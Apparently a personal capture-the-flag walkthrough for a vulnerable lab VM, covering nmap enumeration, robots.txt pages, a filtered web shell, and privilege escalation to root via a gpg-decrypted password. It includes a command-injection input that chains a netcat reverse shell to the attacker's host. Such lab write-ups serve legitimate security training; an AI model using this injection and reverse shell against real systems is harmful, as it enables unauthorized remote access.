#machine 

Basic TCP enumeration
```bash
 # Nmap 7.94 scan initiated Sun Jan 21 13:37:01 2024 as: nmap -p- -sS -n -Pn --min-rate 5000 -oG ports 192.168.1.92
Host: 192.168.1.92 ()   Status: Up
Host: 192.168.1.92 ()   Ports: 21/open/tcp//ftp///, 80/open/tcp//http///, 25468/open/tcp/////   Ignored State: closed (65532)
 # Nmap done at Sun Jan 21 13:37:01 2024 -- 1 IP address (1 host up) scanned in 0.59 second
```

Services enumeration
```perl
   1   │ # Nmap 7.94 scan initiated Sun Jan 21 13:39:17 2024 as: nmap -p 21,80,25468 -sCV -vvv -oN services 192.168.1.92
   2   │ Nmap scan report for Milburg-High.local (192.168.1.92)
   3   │ Host is up, received arp-response (0.00028s latency).
   4   │ Scanned at 2024-01-21 13:39:18 -03 for 6s
   5   │ 
   6   │ PORT      STATE SERVICE REASON         VERSION
   7   │ 21/tcp    open  ftp     syn-ack ttl 64 ProFTPD 1.3.5b
   8   │ 80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
   9   │ | http-methods: 
  10   │ |_  Supported Methods: OPTIONS HEAD GET POST
  11   │ | http-robots.txt: 4 disallowed entries 
  12   │ | /login.php /dev_shell.php /lat_memo.html 
  13   │ |_/passwords.html
  14   │ |_http-server-header: Apache/2.4.25 (Debian)
  15   │ |_http-title: Site doesn't have a title (text/html).'
  16   │ 25468/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
  17   │ | ssh-hostkey: 
  18   │ |   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
  19   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt2rmQKSTx+fbTOy3a0DG0GI5KOP+x81YHI31kH8V+gXu+BhrvzTtvQbg/KUaxkxNXirQKm3v23b/BNGLm2EmG28T8H1kisT5LhmfJ+w1X/Y7xnXiTYxwxKWF8NHMsQGIKWB8bCPK+2LvG3MdF6cKniSIiT8C8N66F6yTPQyu
       │ W9z68pK7Zj4wm0nrkvQ9Mr++Kj4A4WIhxaYd0+hPnSUNIGLr+XC7mRVUtDSvfP0RqguibeQ2yoB974ZTF0uU0Zpq7BK8/loAl4nFu/6vwLU7BjYm3BlU3fvjDNlSwqbsjwgn/kTfySxZ/WiifZW3U1WLLdY4CQZ++nR2odDNy8YQb
  20   │ |   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
  21   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIntdI8IcX2n63A3tEIasPt0W0Lg31IAVGyzesYMblJsc1zM1jmaJ9d6w6PpZKa+7Ow/5yXX2DOF03pAHXP1S5A=
  22   │ |   256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
  23   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmbgZpOuy0D5idStSgBUVb4JjRuAdv/7XF5dGDJgUqE
  24   │ MAC Address: 08:00:27:23:76:C6 (Oracle VirtualBox virtual NIC)
  25   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  26   │ 
  27   │ Read data files from: /usr/bin/../share/nmap
  28   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  29   │ # Nmap done at Sun Jan 21 13:39:24 2024 -- 1 IP address (1 host up) scanned in 7.03 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

robots.txt
```bash
User-agent: *
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html
```

web info
```bash
# whatweb http://192.168.1.92
http://192.168.1.92 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.92]
```

In /lat_memo.php we can find this 
```
Memo sent at GMT+10:00 2:37:42 by User: Bob  
Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.  
  
-Bob
```

in /passwords.html
```
Really who made this file at least get a hash of your password to display, hackers can't do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. >:(  
-Bob
```

in /dev_shell we found
![[Pasted image 20240121135036.png]]
They doesn't let us to do a `ls` so we can `echo *`
![[Pasted image 20240121135242.png]]

we send us a reverse shell with this command `echo && nc 192.168.1.61 4433 -e /bin/bash`

we acces to file in bob folder
```bash
#notes.sh
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```
HARPOCRATES

we decript the gpg file in bob direcotry
```
gpg --batch --passphrase HARPOCRATES -d login.txt.gpg 
```

we access as bob 

then su -l 

and we are root 

```bash
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
```